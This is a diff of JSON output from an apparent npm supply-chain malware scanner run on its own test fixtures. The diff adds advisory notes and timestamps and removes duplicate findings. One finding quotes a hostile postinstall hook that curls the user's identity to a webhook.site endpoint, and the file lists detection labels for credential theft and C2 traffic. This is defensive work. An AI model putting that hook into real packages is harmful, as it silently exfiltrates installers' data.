@@ -1,15 +1,15 @@
 {
   "scan_path": "../shai-hulud-detect/test-cases/",
-  "start_time": "2025-09-28T22:35:59.270162800Z",
-  "end_time": "2025-09-28T22:35:59.794619200Z",
-  "duration_seconds": 0.524,
-  "timestamp": "2025-09-28T22:35:59.270162800Z",
+  "start_time": "2025-09-28T23:42:05.032159900Z",
+  "end_time": "2025-09-28T23:42:05.465283800Z",
+  "duration_seconds": 0.433,
+  "timestamp": "2025-09-28T23:42:05.032159900Z",
   "files_scanned": 0,
   "results": [
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: ansi-styles@6.2.2",
+      "comment": "Suspicious package version: ansi-styles@6.2.2\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_version"
       ],
@@ -22,7 +22,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: chalk@5.6.1",
+      "comment": "Suspicious package version: chalk@5.6.1\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_version"
       ],
@@ -35,7 +35,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: debug@4.4.2",
+      "comment": "Suspicious package version: debug@4.4.2\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_version"
       ],
@@ -48,7 +48,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/package.json",
       "risk_level": "Medium",
-      "comment": "Contains crypto libraries or suspicious patterns",
+      "comment": "Contains crypto libraries or suspicious patterns\nNOTE: These may be legitimate crypto tools or framework code.",
       "patterns_detected": [
         "crypto_libraries",
         "crypto_libraries"
@@ -84,7 +84,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @ctrl/deluge@1.2.0",
+      "comment": "Suspicious package version: @ctrl/deluge@1.2.0\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_version"
       ],
@@ -97,7 +97,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @nativescript-community/ui-material-core@7.2.49",
+      "comment": "Suspicious package version: @nativescript-community/ui-material-core@7.2.49\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_version"
       ],
@@ -119,7 +119,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/package.json",
       "risk_level": "Medium",
-      "comment": "Contains crypto libraries or suspicious patterns",
+      "comment": "Contains crypto libraries or suspicious patterns\nNOTE: These may be legitimate crypto tools or framework code.",
       "patterns_detected": [
         "crypto_libraries",
         "crypto_libraries",
@@ -165,7 +165,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @ctrl/tinycolor@4.1.1",
+      "comment": "Suspicious package version: @ctrl/tinycolor@4.1.1\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -178,7 +178,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @ctrl/tinycolor@4.1.2",
+      "comment": "Suspicious package version: @ctrl/tinycolor@4.1.2\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -191,7 +191,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.36",
+      "comment": "Suspicious package version: @operato/board@9.0.36\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -204,7 +204,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.37",
+      "comment": "Suspicious package version: @operato/board@9.0.37\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -217,7 +217,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.38",
+      "comment": "Suspicious package version: @operato/board@9.0.38\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -230,7 +230,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.39",
+      "comment": "Suspicious package version: @operato/board@9.0.39\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -243,7 +243,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.40",
+      "comment": "Suspicious package version: @operato/board@9.0.40\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -256,7 +256,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.41",
+      "comment": "Suspicious package version: @operato/board@9.0.41\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -269,7 +269,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.42",
+      "comment": "Suspicious package version: @operato/board@9.0.42\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -282,7 +282,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.43",
+      "comment": "Suspicious package version: @operato/board@9.0.43\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -295,7 +295,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.44",
+      "comment": "Suspicious package version: @operato/board@9.0.44\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -308,7 +308,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.45",
+      "comment": "Suspicious package version: @operato/board@9.0.45\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -321,7 +321,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.46",
+      "comment": "Suspicious package version: @operato/board@9.0.46\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -334,7 +334,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.35",
+      "comment": "Suspicious package version: @operato/board@9.0.35\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -347,7 +347,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.47",
+      "comment": "Suspicious package version: @operato/board@9.0.47\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -360,7 +360,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.48",
+      "comment": "Suspicious package version: @operato/board@9.0.48\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -373,7 +373,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.49",
+      "comment": "Suspicious package version: @operato/board@9.0.49\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -386,7 +386,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.50",
+      "comment": "Suspicious package version: @operato/board@9.0.50\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -399,7 +399,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious package version: @operato/board@9.0.51",
+      "comment": "Suspicious package version: @operato/board@9.0.51\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "suspicious_package_semver"
       ],
@@ -429,7 +429,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected",
+      "comment": "Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "xmlhttprequest_modification",
         "attacker_wallet",
@@ -446,7 +446,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected",
+      "comment": "Suspicious patterns detected: Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "attacker_wallet",
         "npmjs_help",
@@ -461,7 +461,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Ethereum wallet address patterns detected",
+      "comment": "Suspicious patterns detected: Ethereum wallet address patterns detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "ethereum_addresses"
       ],
@@ -472,7 +472,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: Potential typosquatting package detected",
+      "comment": "Suspicious patterns detected: Potential typosquatting package detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "typosquatting_detection"
       ],
@@ -483,7 +483,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: Pastebin exfiltration detected, Hardcoded private IP address detected, C2 WebSocket connection detected",
+      "comment": "Suspicious patterns detected: Pastebin exfiltration detected, Hardcoded private IP address detected, C2 WebSocket connection detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "pastebin_exfiltration",
         "private_ip_hardcoded",
@@ -498,7 +498,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/edge-case-project/documentation.md",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "trufflehog_references",
         "credential_scanning",
@@ -513,7 +513,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "credential_scanning",
         "credential_mentions"
@@ -526,7 +526,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/express-server.js",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Potential typosquatting package detected, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Potential typosquatting package detected, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "credential_scanning",
         "typosquatting_detection",
@@ -541,7 +541,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "credential_scanning",
         "credential_mentions"
@@ -554,7 +554,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint"
@@ -567,7 +567,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Contains credential scanning patterns, Potentially suspicious environment variable access, Credential mentions detected",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Contains credential scanning patterns, Potentially suspicious environment variable access, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint",
@@ -586,7 +586,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected",
+      "comment": "Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "xmlhttprequest_modification",
         "attacker_wallet",
@@ -603,7 +603,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint",
@@ -622,7 +622,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint"
@@ -635,7 +635,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint"
@@ -648,7 +648,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh",
       "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "trufflehog_references",
         "credential_scanning",
@@ -663,7 +663,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
       "risk_level": "Low",
-      "comment": "Suspicious patterns detected: Ethereum wallet address patterns detected",
+      "comment": "Suspicious patterns detected: Ethereum wallet address patterns detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "ethereum_addresses"
       ],
@@ -674,7 +674,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py",
       "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected",
+      "comment": "Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "trufflehog_references",
         "credential_scanning",
@@ -689,7 +689,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/mixed-project/suspicious.js",
       "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: webhook.site reference, webhook.site reference",
+      "comment": "Suspicious patterns detected: webhook.site reference, webhook.site reference\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_alternative",
         "webhook_site_alternative"
@@ -702,7 +702,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js",
       "risk_level": "High",
-      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Hardcoded private IP address detected, C2 WebSocket connection detected",
+      "comment": "Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Hardcoded private IP address detected, C2 WebSocket connection detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "webhook_site_reference",
         "malicious_webhook_endpoint",
@@ -719,7 +719,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/typosquatting-project/package.json",
       "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: Potential typosquatting package detected",
+      "comment": "Suspicious patterns detected: Potential typosquatting package detected\nNOTE: Manual review required to determine if these are malicious.",
       "patterns_detected": [
         "typosquatting_detection"
       ],
@@ -778,7 +778,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
       "risk_level": "High",
-      "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
+      "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)\nNOTE: Postinstall hooks can execute arbitrary code during package installation.",
       "patterns_detected": [
         "suspicious_postinstall_hook"
       ],
@@ -791,7 +791,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js",
       "risk_level": "High",
-      "comment": "XMLHttpRequest prototype modification detected",
+      "comment": "XMLHttpRequest prototype modification detected\nNOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.",
       "patterns_detected": [
         "xmlhttprequest_hijacking"
       ],
@@ -802,8 +802,20 @@
     },
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
+      "risk_level": "Medium",
+      "comment": "JavaScript obfuscation detected",
+      "patterns_detected": [
+        "javascript_obfuscation"
+      ],
+      "details": [
+        "JavaScript obfuscation detected",
+        "This may indicate attempts to hide malicious code"
+      ]
+    },
+    {
+      "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js",
       "risk_level": "High",
-      "comment": "Known attacker wallet address detected - HIGH RISK",
+      "comment": "Known attacker wallet address detected - HIGH RISK\nNOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.",
       "patterns_detected": [
         "known_attacker_wallet"
       ],
@@ -828,7 +840,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
       "risk_level": "Medium",
-      "comment": "Potential cryptocurrency patterns: Ethereum wallet address patterns detected",
+      "comment": "Potential cryptocurrency patterns: Ethereum wallet address patterns detected\nNOTE: These may be legitimate crypto tools or framework code.",
       "patterns_detected": [
         "potential_crypto_patterns"
       ],
@@ -837,20 +849,9 @@
       ]
     },
     {
-      "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js",
-      "risk_level": "Medium",
-      "comment": "Ethereum wallet address patterns detected",
-      "patterns_detected": [
-        "ethereum_wallet_patterns"
-      ],
-      "details": [
-        "Ethereum wallet address patterns detected"
-      ]
-    },
-    {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
       "risk_level": "High",
-      "comment": "XMLHttpRequest prototype modification detected",
+      "comment": "XMLHttpRequest prototype modification detected\nNOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.",
       "patterns_detected": [
         "xmlhttprequest_hijacking"
       ],
@@ -862,20 +863,9 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
       "risk_level": "Medium",
-      "comment": "Potential cryptocurrency patterns: Ethereum wallet address patterns detected",
+      "comment": "Potential cryptocurrency patterns: Ethereum wallet address patterns detected\nNOTE: These may be legitimate crypto tools or framework code.",
       "patterns_detected": [
         "potential_crypto_patterns"
-      ],
-      "details": [
-        "Ethereum wallet address patterns detected"
-      ]
-    },
-    {
-      "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js",
-      "risk_level": "Medium",
-      "comment": "Ethereum wallet address patterns detected",
-      "patterns_detected": [
-        "ethereum_wallet_patterns"
       ],
       "details": [
         "Ethereum wallet address patterns detected"
@@ -994,7 +984,7 @@
     {
       "file": "/c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-lockfile/package-lock.json",
       "risk_level": "Medium",
-      "comment": "Package lockfile integrity issues: Compromised packages detected: @ctrl/tinycolor@4.1.2",
+      "comment": "Package lockfile integrity issues: Compromised packages detected: @ctrl/tinycolor@4.1.2\nNOTE: These issues may indicate tampering with package dependencies.",
       "patterns_detected": [
         "package_integrity_issue"
       ],
@@ -1160,8 +1150,8 @@
   ],
   "summary": {
     "high_risk_count": 22,
-    "medium_risk_count": 59,
+    "medium_risk_count": 58,
     "low_risk_count": 9,
-    "total_issues": 90
+    "total_issues": 89
   }
 }
